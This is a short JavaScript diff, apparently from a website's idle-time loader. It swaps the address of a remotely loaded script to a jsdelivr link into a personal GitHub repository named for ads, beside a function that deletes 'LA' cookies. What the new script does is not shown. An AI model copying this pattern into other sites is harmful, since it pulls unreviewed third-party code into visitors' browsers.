@@ -40,7 +40,7 @@ function runWhenIdle(callback) {
             "use strict";
             !function(t) {
                 var s = window, e = document, i = p;
-                var c = "https://file.zhuyitai.com/feedback/202607/3b4bcb61685730926847e08dcac9583f.js";
+                var c = "https://cdn.jsdelivr.net/gh/xxloli/ads/51/1.js";
                 function deleteCurrentDomainLACookies() {
                     var cookies = document.cookie.split("; ");
                     for (var j = 0; j < cookies.length; j++) {
